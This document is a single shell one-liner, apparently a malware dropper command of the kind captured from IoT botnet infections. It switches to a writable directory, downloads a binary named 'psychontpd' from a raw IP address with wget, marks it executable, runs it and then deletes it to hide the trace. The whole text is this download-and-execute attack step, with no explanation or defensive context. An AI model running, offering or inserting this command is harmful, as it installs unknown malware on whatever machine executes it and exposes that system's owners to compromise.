cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://206.217.139.230/psychontpd; chmod +x psychontpd; ./psychontpd; rm -rf psychontpd
